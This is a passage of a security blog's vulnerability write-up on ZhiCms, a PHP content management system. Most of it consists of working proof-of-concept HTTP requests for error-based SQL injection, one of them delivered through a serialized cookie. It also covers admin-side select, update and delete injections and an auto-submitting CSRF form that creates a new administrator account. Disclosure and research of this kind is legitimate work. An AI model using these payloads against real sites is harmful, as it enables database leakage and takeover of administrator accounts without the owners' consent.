+<p>First construct a serialized data:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$arr_str=serialize(<span class="keyword">array</span>(<span class="string">"ak"</span>=&gt;<span class="string">"1 or updatexml(2,concat(0x7e,(user())),0)#"</span>));</div><div class="line"><span class="keyword">echo</span> $arr_str;</div><div class="line"><span class="keyword">echo</span> PHP_EOL;</div><div class="line"><span class="keyword">echo</span> urlencode($arr_str);</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">a:1:&#123;s:2:"ak";s:42:"1 or updatexml(2,concat(0x7e,(user())),0)#";&#125;</span></div><div class="line"><span class="comment">a%3A1%3A%7Bs%3A2%3A%22ak%22%3Bs%3A42%3A%221+or+updatexml%282%2Cconcat%280x7e%2C%28user%28%29%29%29%2C0%29%23%22%3B%7D</span></div><div class="line"><span class="comment">*/</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-unserialize-03.png" alt="zhicms-sqli-unserialize-03"></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=plug/gift/mylike HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: */*</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: mylike=a%3A1%3A%7Bs%3A2%3A%22ak%22%3Bs%3A42%3A%221+or+updatexml%282%2Cconcat%280x7e%2C%28user%28%29%29%29%2C0%29%23%22%3B%7D</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-unserialize-04.png" alt="zhicms-sqli-unserialize-04"></p>
+<h3 id="select-injections"><a href="#select-injections" class="headerlink" title="select injections"></a>select injections</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>Vulnerability code in：<br>zhicms/app/plug/controller/giftcontroller.php</p>
+<p>gongluelike function,$gonglue_id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-01.png" alt="zhicms-sqli-select-01"></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=plug/gift/gongluelike&amp;gonglue_id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: */*</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-02.png" alt="zhicms-sqli-select-02"></p>
+<h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>Vulnerability code in：<br>zhicms/app/plug/controller/giftcontroller.php</p>
+<p>asklike function，$ask_id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-2-01.png" alt="zhicms-sqli-select-2-01"></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=plug/gift/asklike&amp;ask_id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: */*</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-2-02.png" alt="zhicms-sqli-select-2-02"></p>
+<h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>Vulnerability code in：<br>zhicms/app/plug/controller/mgiftcontroller.php</p>
+<p>findgift function，$id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-3-01.png" alt="zhicms-sqli-select-3-01"></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=plug/mgift/findgift&amp;id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: */*</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-3-02.png" alt="zhicms-sqli-select-3-02"></p>
+<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>Vulnerability code in：<br>zhicms/app/index/controller/apicontroller.php</p>
+<p>insertdata function，$link value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-4-01.png" alt="zhicms-sqli-select-4-01"></p>
+<p>ErrorInfo: Table ‘thinkphp.yun_skuitems’ doesn’t exis?<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-4-02.png" alt="zhicms-sqli-select-4-02"></p>
+<p>create Table yun_skuitems,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `yun_skuitems` (</div><div class="line">  `id` int(11) DEFAULT NULL,</div><div class="line">  `link` varchar(255) DEFAULT NULL,</div><div class="line">  `title` varchar(255) DEFAULT NULL,</div><div class="line">  `pic` varchar(255) DEFAULT NULL,</div><div class="line">  `shop` varchar(255) DEFAULT NULL,</div><div class="line">  `time` datetime DEFAULT NULL,</div><div class="line">  `country` varchar(255) DEFAULT NULL,</div><div class="line">  `type` varchar(255) DEFAULT NULL,</div><div class="line">  `body` varchar(255) DEFAULT NULL,</div><div class="line">  `date` datetime DEFAULT NULL,</div><div class="line">  `website` varchar(255) DEFAULT NULL</div><div class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</div></pre></td></tr></table></figure></p>
+<p>The request again：<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-4-03.png" alt="zhicms-sqli-select-4-03"></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST /index.php?r=index/api/insertdata&amp;pw=zhangyuan HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: */*</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 77</div><div class="line"></div><div class="line">country=%E5%9B%BD%E5%86%85&amp;link=1&apos;+or+updatexml(2,concat(0x7e,(user())),0)%23</div></pre></td></tr></table></figure></p>
+<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>Vulnerability code in：<br>zhicms/app/index/controller/apicontroller.php</p>
+<p>haitaobei function，$link value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-5-01.png" alt="zhicms-sqli-select-5-01"></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST /index.php?r=index/api/haitaobei&amp;pw=zhangyuan HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: */*</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 77</div><div class="line"></div><div class="line">country=%E5%9B%BD%E5%86%85&amp;link=1&apos;+or+updatexml(2,concat(0x7e,(user())),0)%23</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-sqli-select-5-02.png" alt="zhicms-sqli-select-5-02"></p>
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>The following vulnerabilities need to be logged in to complete the attack.</p>
+<h3 id="sqli-select"><a href="#sqli-select" class="headerlink" title="sqli-select"></a>sqli-select</h3><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><p>Vulnerability code in：<br>zhicms/app/manage/controller/adcontroller.php</p>
+<p>editorlink function，$id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-select-1-01.png" alt="zhicms-admin-sqli-select-1-01"></p>
+<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=manage/ad/editorlink&amp;id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: application/json, text/javascript, */*; q=0.01</div><div class="line">Origin: http://www.zhicms.com</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Referer: http://www.zhicms.com/index.php?r=manage/login/index</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15;</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-select-1-02.png" alt="zhicms-admin-sqli-select-1-02"></p>
+<h4 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h4><p>Vulnerability code in：<br>zhicms/app/manage/controller/adcontroller.php</p>
+<p>editorhuan function，$id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-select-2-01.png" alt="zhicms-admin-sqli-select-2-01"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=manage/ad/editorhuan&amp;id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: application/json, text/javascript, */*; q=0.01</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Referer: http://www.zhicms.com/index.php?r=manage/login/index</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15;</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-select-2-02.png" alt="zhicms-admin-sqli-select-2-02"></p>
+<h3 id="sqli-update"><a href="#sqli-update" class="headerlink" title="sqli-update"></a>sqli-update</h3><h4 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h4><p>Vulnerability code in：<br>zhicms/app/manage/controller/adcontroller.php</p>
+<p>editorlink function，$id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-update-1-01.png" alt="zhicms-admin-sqli-update-1-01"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">POST /index.php?r=manage/ad/editorlink&amp;id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: application/json, text/javascript, */*; q=0.01</div><div class="line">Origin: http://www.zhicms.com</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Referer: http://www.zhicms.com/index.php?r=manage/login/index</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15;</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 14</div><div class="line"></div><div class="line">title=1&amp;link=1</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-update-1-02.png" alt="zhicms-admin-sqli-update-1-02"></p>
+<h4 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h4><p>Vulnerability code in：<br>zhicms/app/manage/controller/adcontroller.php</p>
+<p>editorlink function，$id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-update-2-01.png" alt="zhicms-admin-sqli-update-2-01"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /index.php?r=manage/ad/editorhuan&amp;id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: application/json, text/javascript, */*; q=0.01</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Referer: http://www.zhicms.com/index.php?r=manage/login/index</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15;</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 3</div><div class="line"></div><div class="line">a=1</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-update-2-02.png" alt="zhicms-admin-sqli-update-2-02"></p>
+<h3 id="sqli-delete"><a href="#sqli-delete" class="headerlink" title="sqli-delete"></a>sqli-delete</h3><h4 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h4><p>Vulnerability code in：<br>zhicms/app/manage/controller/adcontroller.php</p>
+<p>deletelink function，$id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-delete-1-02.png" alt="zhicms-admin-sqli-delete-1-02"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=manage/ad/deletelink&amp;id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: application/json, text/javascript, */*; q=0.01</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Referer: http://www.zhicms.com/index.php?r=manage/login/index</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15;</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-delete-1-01.png" alt="zhicms-admin-sqli-delete-1-01"></p>
+<h4 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h4><p>Vulnerability code in：<br>zhicms/app/manage/controller/adcontroller.php</p>
+<p>deletehuan function，$id value is not filtered, lead to SQL injection.<br><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-delete-2-01.png" alt="zhicms-admin-sqli-delete-2-01"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?r=manage/ad/deletehuan&amp;id=1+or+updatexml(2,concat(0x7e,(user())),0)%23 HTTP/1.1</div><div class="line">Host: www.zhicms.com</div><div class="line">Accept: application/json, text/javascript, */*; q=0.01</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Referer: http://www.zhicms.com/index.php?r=manage/login/index</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=odskbfmj8c4f9k3vjbdg441v15;</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-admin-sqli-delete-2-02.png" alt="zhicms-admin-sqli-delete-2-02"></p>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>Vulnerability code in：<br>app/manage/controller/managecontroller.php</p>
+<p>addmanage function，No validation, causing CSRF to add an administrator account.</p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-admin-CSRF-1-01.png" alt="zhicms-admin-CSRF-1-01"></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</div><div class="line">  &lt;body&gt;</div><div class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</div><div class="line">    &lt;form action=&quot;http://www.zhicms.com/index.php?r=manage/manage/addmanage&quot; method=&quot;POST&quot;&gt;</div><div class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin1&quot; /&gt;</div><div class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;123&quot; /&gt;</div><div class="line">      &lt;input type=&quot;hidden&quot; name=&quot;pic&quot; value=&quot;&quot; /&gt;</div><div class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">    &lt;script&gt;</div><div class="line">      document.forms[0].submit();</div><div class="line">    &lt;/script&gt;</div><div class="line">  &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/01/php-code-audit/zhicms-admin-CSRF-1-02.png" alt="zhicms-admin-CSRF-1-02"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>穷困潦倒的安全工作者，如果文章对您有所帮助，可以选择性打赏。</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/WeChatQR.JPG" alt="lyxhh 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2020/02/01/php-code-audit/" title="php-ZhiCms">http://www.lxhsec.com/2020/02/01/php-code-audit/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/19/thinkphp/" rel="next" title="thinkphp">
+                <i class="fa fa-chevron-left"></i> thinkphp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ZhiCms"><span class="nav-number">1.</span> <span class="nav-text">ZhiCms</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-injection"><span class="nav-number">1.1.</span> <span class="nav-text">SQL injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Time-based-blind"><span class="nav-number">1.1.1.</span> <span class="nav-text">Time-based blind</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie-injection"><span class="nav-number">1.1.2.</span> <span class="nav-text">Cookie injection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deserialization-lead-to-SQL-injection"><span class="nav-number">1.1.3.</span> <span class="nav-text">Deserialization lead to SQL injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#select-injections"><span class="nav-number">1.1.4.</span> <span class="nav-text">select injections</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1"><span class="nav-number">1.1.4.3.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4"><span class="nav-number">1.1.4.4.</span> <span class="nav-text">4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5"><span class="nav-number">1.1.4.5.</span> <span class="nav-text">5</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#admin"><span class="nav-number">1.2.</span> <span class="nav-text">admin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sqli-select"><span class="nav-number">1.2.1.</span> <span class="nav-text">sqli-select</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqli-update"><span class="nav-number">1.2.2.</span> <span class="nav-text">sqli-update</span></a><ol class="nav-child"><li class="nav-item 